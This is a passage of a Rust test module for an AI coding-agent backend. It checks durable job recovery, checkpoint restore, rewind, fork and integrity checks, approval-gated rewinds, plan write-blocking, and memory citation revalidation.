                budget,
            )
            .with_goal("goal_abc")
            .with_repo("repo_main")
            .with_schedule(Schedule::new("0 9 * * 1-5").with_timezone("UTC"));
            let created = host.job_create(job).await.unwrap();
            job_id = created.job_id.clone();
            assert_eq!(created.status, JobStatus::Pending);
            // A `job.created` event was appended to the durable session log.
            let events = host
                .services
                .event_log
                .scan(Some(session.clone()), None, None)
                .await
                .unwrap();
            assert!(events.iter().any(|e| e.kind == "job.created"));
        }

        // A FRESH host over the same workspace recovers the pending job durably.
        let reopened = BackendHost::open_workspace(&dir).unwrap();
        let recovered = reopened.jobs_recover();
        assert_eq!(recovered.len(), 1, "the pending job survives restart");
        assert_eq!(recovered[0].job_id, job_id);
        assert_eq!(recovered[0].status, JobStatus::Pending);
        assert_eq!(recovered[0].goal_id.as_deref(), Some("goal_abc"));
        assert_eq!(recovered[0].repo_id.as_deref(), Some("repo_main"));
        // job_get returns the same durable record verbatim.
        let got = reopened.job_get(&job_id).expect("job is durably stored");
        assert_eq!(got.triggers.len(), 2);
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn job_evaluate_triggers_matches_glob_and_manual_deterministically() {
        use crate::services::{Budget, JobRecord, Trigger, TriggerEvent};
        let dir = std::env::temp_dir().join(format!("hide_job_triggers_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();

        // A job that wakes on a Rust source change OR an explicit manual event.
        let job = JobRecord::pending(
            session.clone(),
            vec![
                Trigger::FileChange("src/**/*.rs".to_string()),
                Trigger::Manual,
            ],
            Budget::default(),
        );

        // FileChange glob: a matching nested path fires; a non-matching path does not.
        assert!(
            host.job_evaluate_triggers(
                &job,
                &TriggerEvent::FileChange("src/host/mod.rs".to_string()),
            ),
            "a src/**/*.rs path matches the FileChange glob"
        );
        assert!(
            !host.job_evaluate_triggers(
                &job,
                &TriggerEvent::FileChange("docs/readme.md".to_string()),
            ),
            "a non-source path does not match"
        );

        // A Manual trigger fires ONLY on a manual event, not on any other kind.
        assert!(host.job_evaluate_triggers(&job, &TriggerEvent::Manual));
        assert!(
            !host.job_evaluate_triggers(&job, &TriggerEvent::GitPush),
            "GitPush does not match a job with no GitPush trigger"
        );

        // A Manual-ONLY job never fires on a FileChange event (Manual is explicit).
        let manual_only = JobRecord::pending(
            session.clone(),
            vec![Trigger::Manual],
            Budget::default(),
        );
        assert!(host.job_evaluate_triggers(&manual_only, &TriggerEvent::Manual));
        assert!(
            !host.job_evaluate_triggers(
                &manual_only,
                &TriggerEvent::FileChange("src/lib.rs".to_string()),
            ),
            "a Manual trigger fires only on a manual event"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn job_status_transitions_and_cancel_are_durable_and_recovery_excludes_terminal() {
        use crate::services::{Budget, JobRecord, Trigger};
        let dir = std::env::temp_dir().join(format!("hide_job_status_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();

        // Two jobs: one we advance to Done, one we cancel; a third stays Blocked.
        let a = host
            .job_create(JobRecord::pending(
                session.clone(),
                vec![Trigger::Manual],
                Budget::default(),
            ))
            .await
            .unwrap();
        let b = host
            .job_create(JobRecord::pending(
                session.clone(),
                vec![Trigger::CiFailure],
                Budget::default(),
            ))
            .await
            .unwrap();
        let c = host
            .job_create(JobRecord::pending(
                session.clone(),
                vec![Trigger::GitPush],
                Budget::default(),
            ))
            .await
            .unwrap();

        // Running -> Done for A (durable); Blocked with an error for C.
        let running = host
            .job_update_status(&a.job_id, JobStatus::Running, None)
            .await
            .unwrap()
            .expect("job A exists");
        assert_eq!(running.status, JobStatus::Running);
        assert!(running.updated_ms >= a.created_ms);
        host.job_update_status(&a.job_id, JobStatus::Done, None)
            .await
            .unwrap();
        let blocked = host
            .job_update_status(
                &c.job_id,
                JobStatus::Blocked,
                Some("waiting on upstream push".to_string()),
            )
            .await
            .unwrap()
            .expect("job C exists");
        assert_eq!(blocked.status, JobStatus::Blocked);
        assert_eq!(blocked.last_error.as_deref(), Some("waiting on upstream push"));

        // Cancel B durably (terminal).
        let cancelled = host.job_cancel(&b.job_id).await.unwrap().expect("job B exists");
        assert_eq!(cancelled.status, JobStatus::Cancelled);

        // Updating / cancelling an unknown job id is a clean None (no panic).
        assert!(host
            .job_update_status("job_missing", JobStatus::Running, None)
            .await
            .unwrap()
            .is_none());
        assert!(host.job_cancel("job_missing").await.unwrap().is_none());

        // A fresh host recovers ONLY the active job (C, Blocked); the Done (A) and
        // Cancelled (B) jobs are excluded from the recovered set.
        let reopened = BackendHost::open_workspace(&dir).unwrap();
        let recovered = reopened.jobs_recover();
        assert_eq!(recovered.len(), 1, "only the Blocked job is active");
        assert_eq!(recovered[0].job_id, c.job_id);
        assert_eq!(recovered[0].status, JobStatus::Blocked);
        // The durable statuses of the terminal jobs are still readable by id.
        assert_eq!(
            reopened.job_get(&a.job_id).unwrap().status,
            JobStatus::Done
        );
        assert_eq!(
            reopened.job_get(&b.job_id).unwrap().status,
            JobStatus::Cancelled
        );
        // job_list surfaces all three, deterministically ordered.
        assert_eq!(reopened.job_list().len(), 3);
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn checkpoint_create_and_restore_folds_source_and_verifies_integrity() {
        let dir = std::env::temp_dir().join(format!("hide_ckpt_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();
        let log = &host.services.event_log;

        // Seed three source events; the 2nd is the checkpoint boundary.
        log.append(NewEvent::system(
            session.clone(),
            "user.intent.submit_turn",
            json!({ "intent": "submit_turn", "args": { "text": "one" } }),
        ))
        .await
        .unwrap();
        let boundary = log
            .append(NewEvent::system(
                session.clone(),
                "agent.message",
                json!({ "role": "assistant", "text": "two" }),
            ))
            .await
            .unwrap();
        log.append(NewEvent::system(
            session.clone(),
            "agent.message",
            json!({ "role": "assistant", "text": "three" }),
        ))
        .await
        .unwrap();

        // Create a checkpoint AT the boundary; assert the boundary + integrity.
        let ckpt = host
            .checkpoint_create(session.clone(), Some(&boundary.id), "before-three")
            .await
            .unwrap();
        assert_eq!(ckpt.at_seq, boundary.seq, "the boundary seq is pinned");
        assert_eq!(ckpt.at_event.as_ref(), Some(&boundary.id));
        assert!(ckpt.verify_integrity(), "the sealed integrity digest verifies");
        // checkpoint_list surfaces it, scoped to the session.
        let list = host.checkpoint_list(&session);
        assert_eq!(list.len(), 1);
        assert_eq!(list[0].checkpoint_id, ckpt.checkpoint_id);

        // Append MORE source events after the checkpoint.
        log.append(NewEvent::system(
            session.clone(),
            "agent.message",
            json!({ "role": "assistant", "text": "four" }),
        ))
        .await
        .unwrap();
        // 5, not 4: the checkpoint itself is now a durable `checkpoint.created` event, which is what
        // lets a reloaded client learn the id again.
        assert_eq!(
            log.scan(Some(session.clone()), None, None).await.unwrap().len(),
            5
        );
        assert!(
            log.scan(Some(session.clone()), None, None)
                .await
                .unwrap()
                .iter()
                .any(|e| e.kind == "checkpoint.created"
                    && e.payload.get("checkpoint_id").and_then(|v| v.as_str())
                        == Some(ckpt.checkpoint_id.as_str())),
            "the sealed checkpoint is recorded durably, not only on the live bus"
        );

        // Restore: the new session carries ONLY the pre-checkpoint history (2).
        // `checkpoint_restore` is `ApprovalPolicy::Ask`, and the policy is enforced at the EFFECT so
        // no channel can route around it, so a direct call stands in the released-gate scope exactly
        // as `run_approved_intent` does.
        let (restored, ancestry, projection) =
            crate::tools::with_approved_writes(host.checkpoint_restore(&ckpt.checkpoint_id))
                .await
                .unwrap();
        assert_ne!(restored, session, "restore mints a fresh session");
        assert_eq!(projection.session_id, restored);
        let restored_events = log.scan(Some(restored.clone()), None, None).await.unwrap();
        assert_eq!(
            restored_events.len(),
            2,
            "restored = source folded to the checkpoint boundary"
        );
        assert!(!restored_events
            .iter()
            .any(|e| e.payload.get("text").and_then(|t| t.as_str()) == Some("three")));
        assert!(!restored_events
            .iter()
            .any(|e| e.payload.get("text").and_then(|t| t.as_str()) == Some("four")));

        // Ancestry is correct + durable (parent = source, boundary = seq/event).
        assert_eq!(ancestry.parent_session_id.as_ref(), Some(&session));
        assert_eq!(ancestry.forked_at, Some(boundary.seq));
        assert_eq!(ancestry.forked_at_event.as_ref(), Some(&boundary.id));
        let looked_up = host
            .services
            .sessions
            .session_record(&host.services.key_value_store, &restored)
            .expect("restore records ancestry durably");
        assert_eq!(looked_up, ancestry);

        // The SOURCE is unchanged (still its 5 events).
        assert_eq!(
            log.scan(Some(session.clone()), None, None).await.unwrap().len(),
            5,
            "restore never touches the source"
        );

        // An UNKNOWN checkpoint id errors (never a bogus restore).
        assert!(
            crate::tools::with_approved_writes(host.checkpoint_restore("ckpt_does-not-exist"))
                .await
                .is_err()
        );

        // A TAMPERED checkpoint (boundary seq moved without re-sealing) is caught
        // by the integrity check, never producing a restore.
        let mut tampered = ckpt.clone();
        tampered.at_seq = boundary.seq + 5;
        CheckpointStore::put(&host.services.key_value_store, &tampered).unwrap();
        let err = crate::tools::with_approved_writes(host.checkpoint_restore(&ckpt.checkpoint_id))
            .await
            .unwrap_err();
        assert!(
            err.to_string().to_lowercase().contains("integrity"),
            "the tamper is caught: {err}"
        );

        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn goal_and_checkpoint_custom_intents_are_wired() {
        let dir = std::env::temp_dir().join(format!("hide_goal_ckpt_intent_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();

        // goal_set via a Custom intent durably records the goal.
        let ack = host
            .handle_intent(Intent::Custom {
                name: "goal_set".to_string(),
                payload: json!({
                    "session_id": session.as_str(),
                    "condition": "tests_pass",
                    "acceptance": ["tests"]
                }),
            })
            .await
            .unwrap();
        assert!(ack.accepted);
        let goal = host.goal_get(&session).expect("goal_set intent stored a goal");
        assert_eq!(goal.condition, "tests_pass");
        assert_eq!(goal.acceptance, vec!["tests".to_string()]);

        // checkpoint_create via a Custom intent (tail boundary) records a checkpoint.
        host.services
            .event_log
            .append(NewEvent::system(
                session.clone(),
                "agent.message",
                json!({ "role": "assistant", "text": "hi" }),
            ))
            .await
            .unwrap();
        let ack = host
            .handle_intent(Intent::Custom {
                name: "checkpoint_create".to_string(),
                payload: json!({ "session_id": session.as_str(), "label": "tail" }),
            })
            .await
            .unwrap();
        assert!(ack.accepted);
        let list = host.checkpoint_list(&session);
        assert_eq!(list.len(), 1, "checkpoint_create intent recorded one checkpoint");
        assert_eq!(list[0].label, "tail");

        let _ = std::fs::remove_dir_all(dir);
    }

    /// A `diff.proposed` code-change event over one file (test helper mirroring how
    /// `record_edit_diff` records an edit: whole-file post-image per hunk).
    async fn append_code_change(
        host: &BackendHost,
        session: &SessionId,
        file: &str,
        after: &str,
    ) -> Event {
        host.services
            .event_log
            .append(NewEvent::system(
                session.clone(),
                "diff.proposed",
                json!({ "hunks": [ { "file": file, "after": after } ] }),
            ))
            .await
            .unwrap()
    }

    /// Consolidation Trace E (model-free): create a checkpoint, apply code +
    /// conversation changes, fail verification, REWIND CODE ONLY (the conversation
    /// is preserved and the code is reverted, and the failing receipt is reported
    /// as invalidated), FORK an alternative from the checkpoint, and COMPARE the
    /// two branches. No model is loaded anywhere.
    #[tokio::test]
    async fn trace_e_rewind_code_only_then_fork_and_compare() {
        let dir = std::env::temp_dir().join(format!("hide_trace_e_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();
        let log = &host.services.event_log;

        // Prefix: a user turn + the file's baseline. The checkpoint pins the tail
        // here (before any buggy change).
        log.append(NewEvent::system(
            session.clone(),
            "user.intent.submit_turn",
            json!({ "intent": "submit_turn", "args": { "text": "add a feature" } }),
        ))
        .await
        .unwrap();
        append_code_change(&host, &session, "src/a.rs", "fn f() {}").await;
        let ckpt = host
            .checkpoint_create(session.clone(), None, "before-change")
            .await
            .unwrap();
        assert!(ckpt.verify_integrity(), "sealed integrity (boundary + coverage) verifies");
        assert_eq!(ckpt.coverage.repo_state.count, 1, "coverage references the 1 baseline file");
        assert!(ckpt.coverage.live_state_capsule.is_none(), "live capsule stays DEFERRED_MODEL_REQUIRED");
        let base_hash = blake3::hash(b"fn f() {}").to_hex().to_string();

        // Apply changes AFTER the checkpoint: a buggy code edit + a conversation
        // message + a FAILING verification receipt over the edited file.
        append_code_change(&host, &session, "src/a.rs", "fn f() { panic!() }").await;
        log.append(NewEvent::system(
            session.clone(),
            "agent.message",
            json!({ "role": "assistant", "text": "explained the change" }),
        ))
        .await
        .unwrap();
        let bad_receipt = log
            .append(NewEvent::system(
                session.clone(),
                "verify.result",
                json!({ "verification_id": "v-1", "scope": ["src/a.rs"], "verdict": { "status": "fail" } }),
            ))
            .await
            .unwrap();

        // REWIND CODE ONLY.
        // `checkpoint_rewind` is `ApprovalPolicy::Ask` and the policy is enforced at the EFFECT, so
        // a direct call stands in the released-gate scope exactly as `run_approved_intent` does.
        let rewound = crate::tools::with_approved_writes(
            host.checkpoint_rewind(&ckpt.checkpoint_id, RewindTarget::Code),
        )
        .await
        .unwrap();
        assert_eq!(rewound.target, RewindTarget::Code);
        // The code is reverted: a.rs is back to its baseline post-image.
        let child_code = host.code_state_of(&rewound.session_id, None).await.unwrap();
        assert_eq!(child_code.get("src/a.rs"), Some(&base_hash), "code reverted to the checkpoint");
        // The conversation is PRESERVED: the post-boundary agent message survives.
        let child_events = log.scan(Some(rewound.session_id.clone()), None, None).await.unwrap();
        assert!(
            child_events.iter().any(|e| e.kind == "agent.message"
                && e.payload.get("text").and_then(|t| t.as_str()) == Some("explained the change")),
            "conversation after the boundary is preserved"
        );
        assert!(
            !child_events.iter().any(|e| e.kind == "diff.proposed"
                && e.payload.get("hunks").is_some()
                && e.payload.to_string().contains("panic")),
            "the buggy post-boundary code edit is gone"
        );
        // The failing receipt is reported as invalidated (its scope intersects the
        // reverted file).
        assert_eq!(rewound.reverted_files, vec!["src/a.rs".to_string()]);
        assert!(
            rewound.invalidated_receipts.contains(&bad_receipt.id),
            "the post-boundary receipt over the reverted file is invalidated"
        );
        // The child opens with a fork-boundary marker whose ordinal split separates
        // the inherited prefix (2 events) from the child's own (the preserved msg).
        let (fp, inherited, own) = rewind::split_inherited_own(&child_events);
        let fp = fp.expect("the rewound child carries a fork.point marker");
        assert_eq!(fp.parent_thread, session, "the marker points at the source thread");
        assert_eq!(fp.start_ordinal, 3, "own history starts after the 2 inherited prefix events");
        assert_eq!(inherited.len(), 2);
        assert!(own.iter().any(|e| e.kind == "agent.message"));

        // FORK an alternative straight from the checkpoint (ephemeral branch), then
        // apply a DIFFERENT fix to it.
        let alt = host.checkpoint_fork(&ckpt.checkpoint_id).await.unwrap();
        assert_ne!(alt.session_id, rewound.session_id);
        append_code_change(&host, &alt.session_id, "src/a.rs", "fn f() { ok() }").await;

        // COMPARE the two branches: a.rs differs (rewound = baseline, alt = the new
        // fix).
        let comparison = host
            .compare_session_code(&rewound.session_id, &alt.session_id)
            .await
            .unwrap();
        assert_eq!(comparison.files.len(), 1);
        assert_eq!(comparison.files[0].file, "src/a.rs");
        assert_eq!(comparison.files[0].status, rewind::ChangeStatus::Modified);

        // The SOURCE is untouched (its buggy edit + receipt still there).
        let source_code = host.code_state_of(&session, None).await.unwrap();
        assert_eq!(
            source_code.get("src/a.rs"),
            Some(&blake3::hash(b"fn f() { panic!() }").to_hex().to_string()),
            "rewind/fork never mutate the source"
        );

        let _ = std::fs::remove_dir_all(dir);
    }

    /// Each rewind mode drops the right domain; replay reproduces the whole
    /// history; inspect verifies integrity, reports no drift on an intact log, and
    /// surfaces the receipts a code rewind invalidates.
    #[tokio::test]
    async fn checkpoint_rewind_modes_replay_and_inspect() {
        let dir = std::env::temp_dir().join(format!("hide_rewind_modes_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();
        let log = &host.services.event_log;

        // Prefix (checkpoint at the tail = seq 1): one baseline file.
        append_code_change(&host, &session, "a.rs", "base").await;
        let ckpt = host.checkpoint_create(session.clone(), None, "cp").await.unwrap();

        // After: a code edit, a conversation message, a failing receipt.
        append_code_change(&host, &session, "a.rs", "edited").await;
        log.append(NewEvent::system(
            session.clone(),
            "agent.message",
            json!({ "role": "assistant", "text": "after" }),
        ))
        .await
        .unwrap();
        log.append(NewEvent::system(
            session.clone(),
            "verify.result",
            json!({ "verification_id": "v", "scope": ["a.rs"], "verdict": { "status": "fail" } }),
        ))
        .await
        .unwrap();

        // BOTH: fold back to the boundary, nothing after survives (just the marker
        // + the single prefix event).
        let both = crate::tools::with_approved_writes(
            host.checkpoint_rewind(&ckpt.checkpoint_id, RewindTarget::Both),
        )
        .await
        .unwrap();
        let both_events = log.scan(Some(both.session_id.clone()), None, None).await.unwrap();
        let (_, _, both_own) = rewind::split_inherited_own(&both_events);
        assert!(both_own.is_empty(), "both-rewind leaves no post-boundary records");
        assert!(!both.reverted_files.is_empty(), "both reverts the post-boundary code");

        // CONVERSATION only: the post-boundary code edit survives, the message does
        // not; no code is reverted so no receipts are invalidated.
        let conv = crate::tools::with_approved_writes(
            host.checkpoint_rewind(&ckpt.checkpoint_id, RewindTarget::Conversation),
        )
        .await
        .unwrap();
        let conv_code = host.code_state_of(&conv.session_id, None).await.unwrap();
        assert_eq!(
            conv_code.get("a.rs"),
            Some(&blake3::hash(b"edited").to_hex().to_string()),
            "conversation rewind keeps the code edit"
        );
        let conv_events = log.scan(Some(conv.session_id.clone()), None, None).await.unwrap();
        assert!(
            !conv_events.iter().any(|e| e.kind == "agent.message"),
            "conversation rewind reverts the post-boundary message"
        );
        assert!(conv.reverted_files.is_empty(), "conversation rewind reverts no code");
        assert!(conv.invalidated_receipts.is_empty(), "no code reverted -> no receipts invalidated");

        // REPLAY: reproduce the whole recorded history onto a fresh branch; the 4
        // post-boundary source events are replayed (3 edits plus the durable
        // `checkpoint.created` record the seal itself now writes).
        let replay = host.checkpoint_replay(&ckpt.checkpoint_id).await.unwrap();
        assert_eq!(replay.replayed_events.len(), 4, "4 post-boundary events replayed");
        let replay_events = log.scan(Some(replay.session_id.clone()), None, None).await.unwrap();
        let (_, _, replay_own) = rewind::split_inherited_own(&replay_events);
        assert_eq!(replay_own.len(), 4, "the replayed events are the child's own history");

        // INSPECT: integrity holds, coverage matches the current log (no drift), and
        // a code rewind would invalidate the failing receipt.
        let inspect = host.checkpoint_inspect(&ckpt.checkpoint_id).await.unwrap();
        assert!(inspect.integrity_ok, "sealed integrity verifies");
        assert!(inspect.coverage_current, "coverage matches the untampered log");
        assert!(inspect.drift.is_empty());
        assert_eq!(inspect.invalidated_receipts.len(), 1, "the failing receipt is invalidated by a code rewind");

        // A tampered checkpoint (coverage altered without re-sealing) fails every
        // rewind path.
        let mut tampered = ckpt.clone();
        tampered.coverage.repo_state = StateRef::of(&["a.rs:forged".to_string()]);
        CheckpointStore::put(&host.services.key_value_store, &tampered).unwrap();
        assert!(!host.checkpoint_inspect(&ckpt.checkpoint_id).await.unwrap().integrity_ok);
        assert!(crate::tools::with_approved_writes(
            host.checkpoint_rewind(&ckpt.checkpoint_id, RewindTarget::Code)
        )
        .await
        .is_err());

        let _ = std::fs::remove_dir_all(dir);
    }

    /// A code rewind does what the UI says: it REVERTS THE WORKING TREE back to the
    /// boundary through the same verifying inverse write the diff reject path uses,
    /// leaves the conversation domain alone, and reports the verification receipts
    /// it invalidates. Driven through the REAL `edit.write_file` tool, so the
    /// `diff.proposed` events carry real hunk identity. Model-free.
    #[tokio::test]
    async fn rewind_code_reverts_the_working_tree_and_reports_invalidated_receipts() {
        let dir = std::env::temp_dir().join(format!("hide_rewind_disk_{}", now_ms()));
        std::fs::create_dir_all(&dir).unwrap();
        let mut config = HideConfig::for_workspace(&dir);
        config.security.workspace_write_default = Decision::Allow;
        let host = BackendHost::from_services(BackendServices::open(config).unwrap()).unwrap();
        let session = host.services.session();
        let log = &host.services.event_log;
        let run = RunId::new();
        let path = dir.join("a.rs").to_string_lossy().to_string();
        std::fs::write(&path, "A0\n").unwrap();

        // Prefix + boundary: one conversation turn, then the checkpoint.
        log.append(NewEvent::system(
            session.clone(),
            "user.intent.submit_turn",
            json!({ "intent": "submit_turn", "args": { "text": "change a.rs" } }),
        ))
        .await
        .unwrap();
        let ckpt = host
            .checkpoint_create(session.clone(), None, "before")
            .await
            .unwrap();

        // After the boundary: a REAL edit (lands on disk + records a hunk), a
        // conversation message, and a receipt scoped to the edited file.
        let result = host
            .dispatch_tool(
                session.clone(),
                Some(run.clone()),
                ToolCall::new("edit.write_file", json!({ "path": path, "content": "A1\n" })),
            )
            .await
            .unwrap();
        assert_eq!(result.status, ToolStatus::Ok, "the scripted edit applies");
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "A1\n");
        log.append(NewEvent::system(
            session.clone(),
            "agent.message",
            json!({ "role": "assistant", "text": "explained the change" }),
        ))
        .await
        .unwrap();
        let receipt = log
            .append(NewEvent::system(
                session.clone(),
                "verify.result",
                // Workspace-RELATIVE, the spelling `run_static_analysis` records (host.rs
                // `handle_static_analysis_intent`). The edit below is dispatched with the absolute
                // path a client sends, so this pairs the two spellings production actually pairs.
                json!({ "verification_id": "v-1", "scope": ["a.rs"], "verdict": { "status": "pass" } }),
            ))
            .await
            .unwrap();

        let rewound = crate::tools::with_approved_writes(
            host.checkpoint_rewind(&ckpt.checkpoint_id, RewindTarget::Code),
        )
        .await
        .unwrap();

        // The claim the UI makes: the file on disk is back to its boundary content.
        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "A0\n",
            "a code rewind reverts the working tree, not just the log"
        );
        assert_eq!(
            rewound.reverted_files,
            vec!["a.rs".to_string()],
            "a reverted file is reported workspace-relative, the spelling receipts use"
        );
        // The receipts it invalidates are reported in the result.
        assert_eq!(
            rewound.invalidated_receipts,
            vec![receipt.id.clone()],
            "the receipt scoped to the reverted file is reported as invalidated"
        );
        // The conversation domain is untouched: the post-boundary message survives
        // in the child, and the source turn is still readable.
        let child_events = log
            .scan(Some(rewound.session_id.clone()), None, None)
            .await
            .unwrap();
        assert!(
            child_events.iter().any(|e| e.kind == "agent.message"
                && e.payload.get("text").and_then(|t| t.as_str()) == Some("explained the change")),
            "a code rewind keeps the conversation"
        );
        assert!(
            child_events
                .iter()
                .any(|e| e.kind == "user.intent.submit_turn"),
            "the inherited conversation prefix is intact"
        );

        let _ = std::fs::remove_dir_all(dir);
    }

    /// A rewind whose `target` is OMITTED is refused at the intent boundary rather
    /// than silently widened to the most destructive domain ("both"). An unknown
    /// label is still refused, and an explicit label still runs.
    #[tokio::test]
    async fn rewind_intent_refuses_an_omitted_target() {
        let dir = std::env::temp_dir().join(format!("hide_rewind_target_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();
        append_code_change(&host, &session, "a.rs", "base").await;
        let ckpt = host.checkpoint_create(session.clone(), None, "cp").await.unwrap();
        append_code_change(&host, &session, "a.rs", "edited").await;

        let err = host
            .handle_goal_checkpoint_intent(
                "checkpoint_rewind",
                &json!({ "checkpoint_id": ckpt.checkpoint_id }),
            )
            .await
            .unwrap_err();
        assert!(
            err.to_string().contains("missing 'target'"),
            "an omitted target is refused, not defaulted: {err}"
        );
        // Nothing was rewound: the source is still the only session with a code fold.
        assert_eq!(
            host.checkpoint_list(&session).len(),
            1,
            "the refusal is inert"
        );

        let err = host
            .handle_goal_checkpoint_intent(
                "checkpoint_rewind",
                &json!({ "checkpoint_id": ckpt.checkpoint_id, "target": "" }),
            )
            .await
            .unwrap_err();
        assert!(err.to_string().contains("unknown target"), "a blank label is refused: {err}");

        // The released-gate scope, which is what `run_approved_intent` wraps this arm in: the rewind
        // effect itself refuses outside it, whatever channel calls it.
        crate::tools::with_approved_writes(host.handle_goal_checkpoint_intent(
            "checkpoint_rewind",
            &json!({ "checkpoint_id": ckpt.checkpoint_id, "target": "conversation" }),
        ))
        .await
        .expect("an explicit target still runs");

        let _ = std::fs::remove_dir_all(dir);
    }

    /// Stage 1 plan domain (bible sec 14): the `plan` projection is emitted with
    /// real steps; approve/edit/reorder Custom intents mutate the DURABLE record
    /// and republish; the write-block holds in suggest-only autonomy.
    #[tokio::test]
    async fn plan_domain_projection_and_mutations_are_wired() {
        use hide_kernel::plan::schema::{Acceptance, Plan, PlanStatus, PlanStep, StepKind};

        let dir = std::env::temp_dir().join(format!("hide_plan_domain_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();

        // A two-step plan: a read-only investigate step + an effectful edit step.
        let investigate = PlanStep::new(
            "investigate",
            StepKind::Investigate,
            Acceptance::predicate("root cause found"),
        );
        let edit = PlanStep::new(
            "apply the fix",
            StepKind::Edit,
            Acceptance::predicate("build passes"),
        );
        let a = investigate.id.clone();
        let b = edit.id.clone();
        let plan = Plan {
            id: hide_core::ids::PlanId::new(),
            title: "fix".to_string(),
            objective: "make it pass".to_string(),
            steps: vec![investigate, edit],
            status: PlanStatus::Active,
            budget: Default::default(),
        };

        // (1) EMIT: publishing the plan pushes a `plan` projection with REAL steps.
        // The write-block holds under suggest-only: the effectful edit step is
        // gated; the read-only investigate step is not.
        let mut rx = host.subscribe_ui();
        host.publish_plan(&session, &plan, Autonomy::SuggestOnly).unwrap();
        let patch = match rx.recv().await.unwrap().kind {
            UiEventKind::ProjectionPatch { projection, patch } => {
                assert_eq!(projection, "plan");
                patch
            }
            other => panic!("expected a plan ProjectionPatch, got {other:?}"),
        };
        let steps = patch.get("steps").and_then(|v| v.as_array()).unwrap();
        assert_eq!(steps.len(), 2, "the projection carries the real steps");
        let edit_patch = steps.iter().find(|s| s["id"] == json!(b.as_str())).unwrap();
        assert_eq!(edit_patch["write_blocked"], json!(true));
        assert_eq!(edit_patch["acceptance"], json!("build passes"));
        let inv_patch = steps.iter().find(|s| s["id"] == json!(a.as_str())).unwrap();
        assert_eq!(inv_patch["write_blocked"], json!(false));

        // (2) approve_plan via a Custom intent mutates the DURABLE record + republishes.
        let ack = host
            .handle_intent(Intent::Custom {
                name: "approve_plan".to_string(),
                payload: json!({ "session_id": session.as_str() }),
            })
            .await
            .unwrap();
        assert!(ack.accepted);
        let record = host.plan_get(&session).expect("durable plan persisted");
        assert!(record.approved);
        assert!(record.steps.iter().all(|s| s.approved));
        // Planning approval must NOT clear the effect gate: the write-block holds.
        assert!(
            record.steps.iter().find(|s| s.id == b.as_str()).unwrap().write_blocked,
            "approve_plan must not grant write authority under suggest-only"
        );

        // (3) edit_plan_step mutates the durable text.
        host.handle_intent(Intent::Custom {
            name: "edit_plan_step".to_string(),
            payload: json!({
                "session_id": session.as_str(),
                "step_id": a.as_str(),
                "text": "dig deeper"
            }),
        })
        .await
        .unwrap();
        assert_eq!(host.plan_get(&session).unwrap().steps[0].text, "dig deeper");

        // (4) reorder_plan swaps the order durably.
        host.handle_intent(Intent::Custom {
            name: "reorder_plan".to_string(),
            payload: json!({
                "session_id": session.as_str(),
                "order": [b.as_str(), a.as_str()]
            }),
        })
        .await
        .unwrap();
        let reordered = host.plan_get(&session).unwrap();
        assert_eq!(reordered.steps[0].id, b.as_str());
        assert_eq!(reordered.steps[1].id, a.as_str());

        // Each mutation republished a `plan` projection on the bus.
        let mut plan_patches = 0;
        while let Ok(ev) = rx.try_recv() {
            if let UiEventKind::ProjectionPatch { projection, .. } = ev.kind {
                if projection == "plan" {
                    plan_patches += 1;
                }
            }
        }
        assert!(
            plan_patches >= 3,
            "approve + edit + reorder each republish, got {plan_patches}"
        );

        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn memory_revalidation_holds_active_while_citations_resolve_then_quarantines() {
        // Two distinct trees: the host's own workspace (durable KV lives under it)
        // and the fixture "repo" the citations are resolved against.
        let dir = std::env::temp_dir().join(format!("hide_mem_reval_{}", now_ms()));
        let repo = std::env::temp_dir().join(format!("hide_mem_repo_{}", now_ms()));
        std::fs::create_dir_all(repo.join("src")).unwrap();
        std::fs::write(repo.join("src").join("lib.rs"), "pub fn target_symbol() {}\n").unwrap();
        std::fs::write(repo.join("README.md"), "# fixture\n").unwrap();

        let host = BackendHost::open_workspace(&dir).unwrap();
        let scope = crate::memory::MemoryScope::Repo("fixture".to_string());

        let record = host
            .memory_add(
                crate::memory::MemoryDraft::new(
                    scope.clone(),
                    "lib exports target_symbol",
                    "code_index",
                    "planner",
                )
                .with_citations(vec![
                    "README.md".to_string(),
                    "src/lib.rs#target_symbol".to_string(),
                ]),
            )
            .unwrap();
        assert_eq!(record.status, crate::memory::MemoryStatus::Active);

        // Every citation resolves -> the record STAYS Active + is context-eligible.
        let pass = host
            .memory_revalidate(
                crate::memory::RevalidateTarget::record(&record.memory_id),
                &repo,
            )
            .unwrap();
        assert_eq!(pass.len(), 1);
        assert!(pass[0].resolved, "citations resolve: {}", pass[0].reason);
        assert!(!pass[0].quarantined);
        assert_eq!(pass[0].status, crate::memory::MemoryStatus::Active);
        assert_eq!(
            host.memory_context(&scope).len(),
            1,
            "an Active record with resolving citations enters context"
        );
        // last_validated_ms was bumped by the passing revalidation.
        assert!(
            host.memory_get(&record.memory_id).unwrap().last_validated_ms >= record.created_ms
        );

        // Remove the cited file: its `path#symbol` citation no longer resolves.
        std::fs::remove_file(repo.join("src").join("lib.rs")).unwrap();
        let fail = host
            .memory_revalidate(
                crate::memory::RevalidateTarget::record(&record.memory_id),
                &repo,
            )
            .unwrap();
        assert!(!fail[0].resolved);
        assert!(fail[0].quarantined, "a vanished citation quarantines");
        assert_eq!(fail[0].status, crate::memory::MemoryStatus::Quarantined);
        assert!(
            fail[0].reason.contains("no longer resolve"),
            "reason names the miss: {}",
            fail[0].reason
        );
        assert_eq!(
            fail[0].unresolved,
            vec!["src/lib.rs#target_symbol".to_string()],
